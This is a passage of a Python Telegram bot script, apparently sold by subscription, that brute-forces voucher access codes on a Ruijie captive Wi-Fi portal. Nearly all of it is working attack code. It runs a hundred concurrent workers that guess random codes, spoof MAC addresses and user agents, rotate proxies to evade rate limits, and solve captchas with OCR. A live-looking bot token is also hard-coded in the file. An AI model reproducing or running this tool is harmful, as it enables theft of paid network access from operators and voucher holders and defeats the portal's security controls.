#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==========================================================================
⚡ RUIJIE ASYNC EXTREME ⚡
 Starlink Voucher Scanner + Telegram Bot  |  Telegram https://t.me/mzw199761
--------------------------------------------------------------------------
 FULL FEATURES MAINTAINED (LOGIC UNCHANGED)
 REGULAR TEXT PROSE AND UI FORMATTED TO THE
 STRICTLY NO MYANMAR TEXT .
==========================================================================
"""

import os
import sys
import re
import json
import time
import random
import string
import hashlib
import asyncio
import datetime

from urllib.parse import urljoin

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType

import ddddocr

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ==============================================================================
#  CONFIG (REPLIT SECRETS COMPATIBLE)
# ==============================================================================

BOT_TOKEN = "8858819080:AAEQ2yT-sJ4xgFAC677ywX527WMa89ePg0U"

# ADMIN_IDS ကို Integer List အဖြစ် စနစ်တကျ ခွဲခြားပြင်ဆင်ခြင်း
ADMIN_IDS_RAW = os.environ.get('ADMIN_IDS', '')
ADMIN_IDS = [7294591323]
if ADMIN_IDS_RAW:
    for x in ADMIN_IDS_RAW.replace(',', ' ').split():
        if x.strip().isdigit():
            ADMIN_IDS.append(int(x.strip()))

# ==============================================================================
#  FILE PATHS
# ==============================================================================

FILE_PATH = "allinone.txt"
LAST_RUN_FILE = "last_run.txt"
PROXY_FILE = "proxies.txt"
PORTAL_URL_PATH = "portal_url_"
PAID_KEYS_FILE = "paid_keys.txt"
OWNER_LICENSE_FILE = "owner_license.txt"

# ==============================================================================
#  ⚡ SPEED SETTINGS ⚡
# ==============================================================================

NUM_WORKERS = 100  # Replit အတွက် RAM/CPU လုံလောက်စေရန် Worker ကို ၂၅၀ မှ ၁၀၀ သို့ ညှိထားပါသည်
MAX_CODES_PER_SESSION = 150
MAX_CODES_PER_SID = 150
TIMEOUT_SEC = 20

# Proxy settings
USE_PROXY = True
PROXY_TIMEOUT = 15
MAX_BAD_PROXIES = 50
PROXY_MAX_FAILS = 10

# ==============================================================================
#  PORTAL ENDPOINTS
# ==============================================================================

PORTAL_BASE = "https://portal-as.ruijienetworks.com"
PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
PORTAL_BALANCE_PAGE = PORTAL_BASE + "/download/static/maccauth/src/balance.html?sessionId="
VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"

# ==============================================================================
#  CHARSETS
# ==============================================================================

CHARSET_DIGITS = "0123456789"
CHARSET_ABC = "abcdefghijkmnopqrstuvwxyz"
CHARSET_MIX = "0123456789abcdefghijklmnopqrstuvwxyz"

_CHARSET_DIGITS_T = tuple(CHARSET_DIGITS)
_CHARSET_ABC_T = tuple(CHARSET_ABC)
_CHARSET_MIX_T = tuple(CHARSET_MIX)

MODES = {
    "num6": "💠 06 • NUM",
    "num7": "💠 07 • NUM",
    "num8": "💠 08 • NUM",
    "num9": "💠 09 • NUM",
    "eng6": "❄️06 • ENG",
    "eng7": "❄️07 • ENG",
    "eng8": "❄️ 08 • ENG",
    "mix6": "Ⓜ️ 06 • MIX",
    "mix7": "Ⓜ️ 07 • MIX",
    "mix8": "Ⓜ️ 08 • MIX",
    "abc6": "🆎 06 • ABC",
    "custom":"📝 Custom",
}

# ==============================================================================
#  COLORS
# ==============================================================================

bred = "\x1b[1;31m"
bgreen = "\x1b[1;32m"
bcyan = "\x1b[1;36m"
white = "\x1b[37m"
yellow = "\x1b[33m"
reset = "\x1b[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
]

_ocr_instance = None
_proxy_manager = None
user_scanners = {}
paid_users = {}

# ==============================================================================
#  AUTO-CREATE FILES
# ==============================================================================

def ensure_files_exist():
    files = {
        FILE_PATH: "",
        PROXY_FILE: "",
        LAST_RUN_FILE: datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        PAID_KEYS_FILE: "# Format: <key_hash>:<expiry>:<plan>:<signature>\n",
    }
    for fname, content in files.items():
        if not os.path.exists(fname):
            try:
                with open(fname, "w") as f:
                    f.write(content)
                print(bgreen + f"[AutoCreate] Created {fname}" + reset)
            except OSError as e:
                print(bred + f"[AutoCreate] Error: {e}" + reset)

def show_banner():
    line = "═" * 60
    print(bred + line)
    print("   ⚔️  Thank You For Use  ⚔️   ")
    print("            Telegram @mzw199761  ")
    print(line + reset)
    print(white + "Summoning  & verifying domain authorization..." + reset)

def encrypt_key_data(key_str, expiry_str):
    return hashlib.sha256(f"{key_str}:{expiry_str}".encode()).hexdigest()

def check_time_integrity():
    now = datetime.datetime.now()
    last_run_time = None
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE) as f:
                raw_text = f.read().strip()
            if raw_text:
                last_run_time = datetime.datetime.strptime(raw_text, "%Y-%m-%d %H:%M:%S")
        except (OSError, ValueError):
            last_run_time = None
    if last_run_time and now < last_run_time:
        print(bred + "[!] ERROR: TIME ANOMALY / ROLLBACK DETECTED!" + reset)
        sys.exit(1)
    try:
        with open(LAST_RUN_FILE, "w") as f:
            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
    except OSError:
        pass

def display_remaining_time(expiry_date):
    now = datetime.datetime.now()
    remaining = int(max((expiry_date - now).total_seconds(), 0))
    days, remainder = divmod(remaining, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    if days:
        time_str = f"{days} days {hours} hour {minutes} min"
    elif hours:
        time_str = f"{hours} hr {minutes} min"
    else:
        time_str = f"{minutes} min"
    print(yellow + f"[*]  Pact Remaining: {time_str}  ")
    print(f"[-] Pact Expiration: ({expiry_date.strftime('%Y-%m-%d %H:%M')}) " + reset)

def check_approval():
    if not os.path.exists(OWNER_LICENSE_FILE):
        print(bgreen + "[+]  Portal Granted Access!" + reset)
        return
    try:
        with open(OWNER_LICENSE_FILE) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) >= 2:
                    expiry_str = ":".join(parts[1:])
                    try:
                        expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    except ValueError:
                        continue
                    if datetime.datetime.now() >= expiry_date:
                        print(bred + f"[!] OWNER  LICENSE EXPIRED" + reset)
                        sys.exit(1)
                    print(bgreen + "[+]  Portal Granted Access!" + reset)
                    display_remaining_time(expiry_date)
                    return
    except Exception as e:
        print(yellow + f"[License]  Error: {e}" + reset)
    print(bgreen + "[+]  Portal Granted Access!" + reset)

def parse_key_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    try:
        first_colon = line.index(":")
        key_hash = line[:first_colon]
        rest = line[first_colon+1:]
        last_colon = rest.rindex(":")
        signature = rest[last_colon+1:]
        rest2 = rest[:last_colon]
        second_last = rest2.rindex(":")
        plan = rest2[second_last+1:]
        expiry_str = rest2[:second_last]
        return {"key_hash": key_hash, "expiry": expiry_str, "plan": plan, "signature": signature}
    except (ValueError, IndexError):
        return None

def load_paid_keys_local():
    keys = {}
    if not os.path.exists(PAID_KEYS_FILE):
        try:
            with open(PAID_KEYS_FILE, "w") as f:
                f.write("# Format: <key_hash>:<expiry>:<plan>:<signature>\n")
        except OSError:
            pass
        return keys
    try:
        with open(PAID_KEYS_FILE) as f:
            for line in f:
                entry = parse_key_line(line)
                if not entry:
                    continue
                if encrypt_key_data(entry["key_hash"], entry["expiry"]) != entry["signature"]:
                    continue
                keys[entry["key_hash"]] = {"expiry": entry["expiry"], "plan": entry["plan"]}
        print(bgreen + f"[PaidKeys]  Seal Loaded {len(keys)} Keys" + reset)
    except Exception as e:
        print(bred + f"[PaidKeys] Load Error: {e}" + reset)
    return keys

def validate_paid_key(user_key):
    if not user_key:
        return None
    user_key = user_key.strip()
    if len(user_key) < 8:
        return None
    keys = load_paid_keys_local()
    if not keys:
        return None
    key_hash = hashlib.sha256(user_key.encode()).hexdigest()[:32]
    entry = keys.get(key_hash)
    if not entry:
        return None
    try:
        expiry_date = datetime.datetime.strptime(entry["expiry"], "%Y-%m-%d %H:%M:%S")
    except (ValueError, KeyError):
        return None
    if datetime.datetime.now() >= expiry_date:
        return {"valid": False, "reason": "expired", "expiry": expiry_date}
    return {"valid": True, "expiry": expiry_date, "plan": entry.get("plan", "paid")}

def is_user_authorized(user_id):
    if user_id in ADMIN_IDS:
        return True
    entry = paid_users.get(user_id)
    if not entry:
        return False
    if datetime.datetime.now() >= entry["expiry"]:
        return False
    return True

def is_admin(user_id):
    return user_id in ADMIN_IDS

def register_paid_user(user_id, key, expiry, plan):
    paid_users[user_id] = {"key": key, "expiry": expiry, "plan": plan}
    try:
        data = {}
        if os.path.exists(PAID_KEYS_FILE + ".users"):
            try:
                with open(PAID_KEYS_FILE + ".users") as f:
                    data = json.load(f)
            except Exception:
                data = {}
        data[str(user_id)] = {"key": key, "expiry": expiry.strftime("%Y-%m-%d %H:%M:%S"), "plan": plan}
        with open(PAID_KEYS_FILE + ".users", "w") as f:
            json.dump(data, f, indent=2)
    except OSError:
        pass

def load_registered_users():
    fpath = PAID_KEYS_FILE + ".users"
    if not os.path.exists(fpath):
        return
    try:
        with open(fpath) as f:
            data = json.load(f)
        for uid_str, entry in data.items():
            try:
                expiry = datetime.datetime.strptime(entry["expiry"], "%Y-%m-%d %H:%M:%S")
            except (ValueError, KeyError):
                continue
            if datetime.datetime.now() < expiry:
                paid_users[int(uid_str)] = {"key": entry.get("key", ""), "expiry": expiry, "plan": entry.get("plan", "paid")}
        print(bgreen + f"[PaidUsers]  Realm Restored {len(paid_users)} Souls" + reset)
    except Exception as e:
        print(yellow + f"[PaidUsers] Load error: {e}" + reset)

class ProxyManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = []
        self.fail_counts = {}
        self.MAX_FAILS = PROXY_MAX_FAILS
        self.lock = asyncio.Lock()
        self.index = 0
        self.load()

    def _normalize(self, proxy):
        proxy = (proxy or "").strip()
        if not proxy or proxy.startswith("#"):
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "socks5://" + proxy
        return proxy

    def _validate_proxy_format(self, proxy):
        try:
            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
            if "@" in rest:
                rest = rest.split("@", 1)[1]
            if ":" not in rest:
                return False
            host, port = rest.rsplit(":", 1)
            if not host or not port:
                return False
            port_num = int(port)
            return 1 <= port_num <= 65535
        except Exception:
            return False

    def load(self):
        try:
            if not os.path.exists(self.file_path):
                with open(self.file_path, "w") as f:
                    f.write("")
                self.proxies = []
                self.bad_proxies = []
                self.fail_counts = {}
                return
            with open(self.file_path) as f:
                raw = f.read().splitlines()
            valid = []
            invalid_count = 0
            for line in raw:
                p = self._normalize(line)
                if p and self._validate_proxy_format(p):
                    valid.append(p)
                elif p:
                    invalid_count += 1
            seen = set()
            self.proxies = []
            for p in valid:
                if p not in seen:
                    seen.add(p)
                    self.proxies.append(p)
            random.shuffle(self.proxies)
            self.bad_proxies = []
            self.fail_counts = {}
            msg = f"[ProxyManager]  Proxies Summoned: {len(self.proxies)}"
            if invalid_count:
                msg += f" ({invalid_count} Banished)"
            print(bgreen + msg + reset)
        except Exception as e:
            print(bred + f"[ProxyManager] Error: {e}" + reset)

    def reload(self):
        self.load()

    def add_proxies(self, proxy_lines):
        added = 0
        invalid = 0
        for line in proxy_lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            p = self._normalize(line)
            if not p or not self._validate_proxy_format(p):
                invalid += 1
                continue
            if p in self.proxies:
                continue
            if p in self.bad_proxies:
                self.bad_proxies.remove(p)
            self.proxies.append(p)
            self.fail_counts[p] = 0
            added += 1
        if added:
            random.shuffle(self.proxies)
        self._save_to_file()
        return added, invalid

    def _save_to_file(self):
        try:
            with open(self.file_path, "w") as f:
                for p in self.proxies:
                    f.write(p + "\n")
        except OSError:
            pass

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            active = [p for p in self.proxies if self.fail_counts.get(p, 0) < self.MAX_FAILS]
            if not active:
                active = self.proxies
            p = active[self.index % len(active)]
            self.index += 1
            return p

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            current_fails = self.fail_counts.get(proxy, 0) + 1
            self.fail_counts[proxy] = current_fails
            if current_fails < self.MAX_FAILS:
                return
            if proxy in self.proxies:
                self.proxies = [p for p in self.proxies if p != proxy]
                self.bad_proxies.append(proxy)
                print(yellow + f"[ProxyManager] 💀 Banished after {current_fails} fails" + reset)
                if len(self.bad_proxies) >= MAX_BAD_PROXIES:
                    self._save_to_file()
                    self.load()

    def stats(self):
        total = len(self.proxies) + len(self.bad_proxies)
        bad = len(self.bad_proxies)
        return total, bad

    def get_active_count(self):
        return len(self.proxies)

def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager

def create_connector_for_proxy(proxy):
    if not proxy or not USE_PROXY:
        return None
    try:
        if proxy.startswith(("socks4://", "socks5://")):
            return ProxyConnector.from_url(proxy, rdns=True)
        return ProxyConnector.from_url(proxy)
    except Exception:
        return None

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

def ocr_image_bytes_fast(image_bytes):
    return get_ocr_instance().classification(image_bytes)

async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        async with session.get(captcha_url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
            if resp.status != 200:
                return None
            image_content = await resp.read()
        if not image_content:
            return None
        text = await asyncio.to_thread(ocr_image_bytes_fast, image_content)
        if not text:
            return None
        return text.strip().upper()
    except Exception:
        return None

def get_user_data(user_id):
    p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
    if os.path.exists(p_file):
        try:
            with open(p_file) as f:
                return f.read().strip()
        except OSError:
            pass
    return None

def generate_random_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}mac={new_mac}"

def build_headers(referer=PORTAL_INDEX):
    return {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json; charset=utf-8",
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
        "Origin": PORTAL_BASE,
        "Referer": referer,
    }

async def get_sid_from_gateway(session, portal_url, user_id):
    mac = generate_random_mac()
    url = replace_mac(portal_url, mac)
    headers = {
        "user-agent": random.choice(USER_AGENTS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    try:
        async with session.get(url, headers=headers, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
            final_url = str(resp.url)
            try:
                body = await resp.text()
            except Exception:
                body = ""
        m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
        if m:
            return m.group(1), final_url
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", body)
        if m:
            return m.group(1), final_url
        m = re.search(r"location\.href\s*=\s*[\'\"]([^\'\"]+)[\'\"]", body)
        if m:
            next_url = urljoin(final_url, m.group(1))
            m2 = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", next_url)
            if m2:
                return m2.group(1), next_url
        return None, final_url
    except Exception:
        return None, None

async def fetch_balance(active_token, code, proxy):
    if not active_token:
        return "📐: N/A, ⏳: N/A"
    connector = create_connector_for_proxy(proxy)
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            url = f"{BALANCE_API}{active_token}"
            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/json;",
                "user-agent": random.choice(USER_AGENTS),
                "x-requested-with": "XMLHttpRequest",
                "Origin": PORTAL_BASE,
                "Referer": PORTAL_BALANCE_PAGE + active_token,
            }
            async with session.get(url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
                if resp.status != 200:
                    return "📐: N/A, ⏳: N/A"
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    return "📐: N/A, ⏳: N/A"
                res = data.get("result", {}) or data.get("data", {}) or {}
                plan = res.get("profileName") or res.get("planName") or "Unknown"
                remaining = res.get("remainingMinutes")
                if remaining is not None:
                    remaining = int(remaining)
                    if remaining >= 0:
                        hh, mm = divmod(remaining, 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                    else:
                        time_str = f"Expired ({remaining} mins)"
                    return f"📐: {plan}, ⏳: {time_str}"
                total = res.get("totalMinutes") or res.get("totalTime")
                if total is not None:
                    hh, mm = divmod(int(total), 60)
                    time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                    return f"📐: {plan}, ⏳: {time_str}"
                return f"📐: {plan}, ⏳: N/A"
    except Exception:
        return "📐: N/A, ⏳: N/A"
    finally:
        if connector is not None:
            try:
                await connector.close()
            except Exception:
                pass

async def check_balance(active_token, code, user_id, proxy_str):
    try:
        with open(FILE_PATH, "a") as f:
            f.write(f"{code}\n")
    except OSError:
        pass
    balance = await fetch_balance(active_token, code, proxy_str)
    plan_name = "Unknown"
    time_str = "N/A"
    if balance and "📐:" in balance:
        try:
            parts = balance.replace("📐:", "").split(", ⏳:")
            if len(parts) >= 2:
                plan_name = parts[0].strip()
                time_str = parts[1].strip()
        except Exception:
            pass
    return plan_name, time_str

async def check_single_access_code(session, code, current_session_id,
                                   login_url, captcha_base_url, verify_url,
                                   headers, user_id, current_proxy):
    if not current_session_id:
        return "net"
    try:
        captcha_url = f"{CAPTCHA_IMAGE_URL}?sessionId={current_session_id}&_t={int(time.time() * 1000)}"
        captcha_text = await solve_captcha_simple_async(session, captcha_url, headers)
        if not captcha_text:
            return "net"

        v_payload = {"sessionId": current_session_id, "authCode": captcha_text}
        v_headers = {
            "content-type": "application/json",
            "user-agent": random.choice(USER_AGENTS),
            "Origin": PORTAL_BASE,
            "Referer": PORTAL_INDEX,
        }
        async with session.post(verify_url, json=v_payload, headers=v_headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as v_resp:
            v_body = await v_resp.text()

        verified = False
        try:
            v_json = json.loads(v_body)
            if v_json.get("success") is True:
                verified = True
        except Exception:
            if '"success":true' in v_body.replace(" ", ""):
                verified = True
        if not verified:
            return "captcha"

        l_payload = {
            "accessCode": code,
            "sessionId": current_session_id,
            "apiVersion": 1,
            "authCode": captcha_text,
        }
        async with session.post(login_url, json=l_payload, headers=v_headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as l_resp:
            body = await l_resp.text()

        body_nospace = body.replace(" ", "")
        if '"success":true' in body_nospace:
            return "hit"

        low = body.lower()
        if "request limited" in low or "exceeds the limit" in low or "limited" in low:
            return "limit"
        return "bad"
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return "net"
    except asyncio.CancelledError:
        raise
    except Exception:
        return "net"

def make_code(mode, start_digit=6, counter=None):
    if mode == "custom" and counter is not None:
        return str(counter).zfill(6)

    if mode == "num6":
        return "".join(random.choices(_CHARSET_DIGITS_T, k=6))
    if mode == "num7":
        return "".join(random.choices(_CHARSET_DIGITS_T, k=7))
    if mode == "num8":
        return "".join(random.choices(_CHARSET_DIGITS_T, k=8))
    if mode == "num9":
        return "".join(random.choices(_CHARSET_DIGITS_T, k=9))

    if mode == "eng6":
        return "".join(random.choices(_CHARSET_ABC_T, k=6))
    if mode == "eng7":
        return "".join(random.choices(_CHARSET_ABC_T, k=7))
    if mode == "eng8":
        return "".join(random.choices(_CHARSET_ABC_T, k=8))

    if mode == "mix6":
        return "".join(random.choices(_CHARSET_MIX_T, k=6))
    if mode == "mix7":
        return "".join(random.choices(_CHARSET_MIX_T, k=7))
    if mode == "mix8":
        return "".join(random.choices(_CHARSET_MIX_T, k=8))

    if mode == "abc6":
        return "".join(random.choices(_CHARSET_ABC_T, k=6))

    return "".join(random.choices(_CHARSET_DIGITS_T, k=6))

async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    pm = get_proxy_manager()
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    mode = state.get("mode", "num6")
    start_digit = state.get("start_digit", 6)
    tried_codes = state["tried_codes"]

    while not stop_event.is_set():
        proxy = await pm.get_next()
        connector = create_connector_for_proxy(proxy)
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
            headers={"user-agent": random.choice(USER_AGENTS)},
        )
        try:
            sid, _gateway = await get_sid_from_gateway(session, state["portal_url"], user_id)
            if not sid:
                state["net"] += 1
                state["recent_logs"].append("⚠️ SID FAILED — RECONNECTING")
                await pm.mark_bad(proxy)
                await asyncio.sleep(0.05)
                continue

            codes_checked_this_sid = 0
            sid_failures = 0
            codes_checked_this_session = 0

            while (codes_checked_this_session < MAX_CODES_PER_SESSION
                   and codes_checked_this_sid < MAX_CODES_PER_SID
                   and not stop_event.is_set()):

                if len(tried_codes) > 500000:
                    state["tried_codes"] = set()
                    tried_codes = state["tried_codes"]

                code = None
                for _ in range(50):
                    if mode == "custom":
                        state["counter"] += 1
                        code = make_code(mode, start_digit, state["counter"])
                    else:
                        code = make_code(mode, start_digit)
                    if code not in tried_codes:
                        break
                if code is None:
                    if mode == "custom":
                        continue
                    break
                tried_codes.add(code)
                state["current_code"] = code

                result = await check_single_access_code(
                    session, code, sid, login_url, captcha_base_url,
                    verify_url, headers, user_id, proxy,
                )
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                state["tried"] += 1

                if result == "hit":
                    state["hits"] += 1
                    state["hit_list"].append(code)
                    state["last_hit"] = code
                    state["recent_logs"].append(f"🔥 HIT: {code}")
                    plan_name, time_str = await check_balance(sid, code, user_id, proxy)
                    now = datetime.datetime.now()
                    state["hit_details"].append({
                        "code": code,
                        "time": now,
                        "plan": plan_name,
                        "time_str": time_str,
                    })
                    break

                elif result == "limit":
                    state["limits"] += 1
                    state["recent_logs"].append(f"⚠️ LIMIT EXCEEDED: {code}")
                    break

                elif result == "net":
                    state["net"] += 1
                    state["recent_logs"].append(f"❌ VOID / NET ERROR: {code}")
                    sid_failures += 1
                    if sid_failures >= 3:
                        await pm.mark_bad(proxy)
                        break

                elif result == "captcha":
                    state["failed"] += 1

                else:
                    state["failed"] += 1

        except asyncio.CancelledError:
            raise
        except Exception:
            state["net"] += 1
            await pm.mark_bad(proxy)
        finally:
            try:
                await session.close()
            except Exception:
                pass
        if stop_event.is_set():
            break
        await asyncio.sleep(0.005)

async def live_dashboard_updater(context, user_id):
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    dash_msg_id = state.get("dash_msg_id")
    pm = get_proxy_manager()
    try:
        while not stop_event.is_set():
            await asyncio.sleep(5)
            if stop_event.is_set():
                break
            elapsed = max(time.time() - state["start_time"], 1)
            speed_cpm = int(state["tried"] / elapsed * 60)
            total, bad = pm.stats()
            active = total - bad
            recent_logs = state["recent_logs"][-5:]
            last_log = recent_logs[-1] if recent_logs else "No Activity"

            hit_lines = []
            for hd in state.get("hit_details", []):
                hit_lines.append(
                    f"⚔️ `{hd['code']}`  •  {hd.get('plan', 'Unknown')}  •  {hd.get('time_str', 'N/A')}"
                )

            total_hits = state.get("hits", 0)
            if hit_lines:
                max_show = 90
                if len(hit_lines) > max_show:
                    hidden = len(hit_lines) - max_show
                    hit_lines_display = [f"... ({hidden} hidden) ..."] + hit_lines[-max_show:]
                else:
                    hit_lines_display = hit_lines
                hit_section = (
                    f"🔨 ** HITS  •  {total_hits}**\n"
                    "╭────────────────────╮\n"
                    + "\n".join(hit_lines_display) + "\n"
                    "╰────────────────────╯"
                )
            else:
                hit_section = (
                    f"🔨 ** HITS  •  {total_hits}**\n"
                    "╭────────────────────╮\n"
                    "│  🖤 No vouchers yet\n"
                    "╰────────────────────╯"
                )

            text = (
                "⚔️ **Thank You For Use** ⚔️\n"
                "❄️ @mzw199761 ❄️\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏰TIME: {state['tried']:,}\n"
                f"🔥Hits: {state['hits']}\n"
                f"⚠️ Limits: {state['limits']}\n"
                f"❌ Net Errors: {state['net']}\n"
                f"⚡ Speed: {speed_cpm:,} c/m\n"
                f"📶 Active : {active}\n"
                f"🗡️ Last Hit: `{state['last_hit'] or '—'}`\n"
                f"📊 Current Code: `{state['current_code'] or '—'}`\n"
                f"⌛ Whispers: {last_log}\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{hit_section}\n"
                "━━━━━━━━━━━━━━━━━━━━━━"
            )

            markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP • ⚡", callback_data="stop_scan")]
            ])

            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=dash_msg_id,
                    text=text, parse_mode=ParseMode.MARKDOWN,
                    reply_markup=markup)
            except Exception as e:
                if "message is not modified" not in str(e).lower():
                    pass
    except asyncio.CancelledError:
        raise

async def live_dashboard_updater_final(context, user_id, state):
    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad
    elapsed = max(time.time() - state["start_time"], 1)
    speed_cpm = int(state["tried"] / elapsed * 60)

    hit_lines = []
    for hd in state.get("hit_details", []):
        hit_lines.append(
            f" `{hd['code']}` ❤️: {hd.get('plan', 'Unknown')}, ⏰ : {hd.get('time_str', 'N/A')}"
        )

    total_hits = state.get("hits", 0)
    if hit_lines:
        hit_section = (
            f"🔨 **HITS  •  {total_hits}**\n"
            "╭────────────────────╮\n"
            + "\n".join(hit_lines) + "\n"
            "╰────────────────────╯"
        )
    else:
        hit_section = (
            f"🔨 ** HITS  •  {total_hits}**\n"
            "╭────────────────────╮\n"
            "│  🖤 No  vouchers  yet\n"
            "╰────────────────────╯"
        )

    final_text = (
        "💀 **Thank You For Use** 💀\n"
        "❄️ @mzw199761 ❄️\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏰ Time: {state['tried']:,}\n"
        f"🔥 Hits: {state['hits']}\n"
        f"⚠️ Limits: {state['limits']}\n"
        f"❌ Net Errors: {state['net']}\n"
        f"⚡  Speed: {speed_cpm:,} c/m\n"
        f"📊 Active Thralls: {active}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{hit_section}\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("‹ 🔁 RETURN  ›", callback_data="btn_back_main")]
    ])

    try:
        await context.bot.edit_message_text(
            chat_id=user_id, message_id=state["dash_msg_id"],
            text=final_text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=markup)
    except Exception:
        pass

async def run_user_scanner(context, user_id):
    if user_scanners.get(user_id, {}).get("running"):
        return
    portal_url = get_user_data(user_id) or PORTAL_INDEX

    state = {
        "running": True,
        "context": context,
        "user_id": user_id,
        "live_hit_msg_id": None,
        "portal_url": portal_url,
        "mode": context.user_data.get("selected_mode", "num6"),
        "start_digit": context.user_data.get("start_digit", 6),
        "counter": int(context.user_data.get("start_digit", 6)) * 100000,
        "stop_event": asyncio.Event(),
        "tried": 0, "hits": 0, "limits": 0, "net": 0, "failed": 0,
        "hit_list": [], "valid_codes": [], "tried_codes": set(),
        "recent_logs": [], "last_hit": None, "current_code": None,
        "start_time": time.time(),
        "hit_details": [],
    }
    user_scanners[user_id] = state

    pm = get_proxy_manager()
    active_count = pm.get_active_count()

    if active_count <= 0:
        await context.bot.send_message(
            chat_id=user_id,
            text="⚠️ **No  Proxies Found in the Abyss!**\n\n"
                 "🕸️ **Send proxy list to unleash the  spell.**\n\n"
                 "Press ➕ Add Proxies button to add proxies.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        state["running"] = False
        return

    dash = await context.bot.send_message(
        chat_id=user_id,
        text="🔮 ⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸...")
    state["dash_msg_id"] = dash.message_id

    headers = build_headers()
    tasks = [asyncio.create_task(
        worker(i, VOUCHER_URL, CAPTCHA_IMAGE_URL,
               CAPTCHA_VERIFY_URL, headers, user_id))
        for i in range(NUM_WORKERS)]
    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
    state["tasks"] = tasks

    try:
        await state["stop_event"].wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        try:
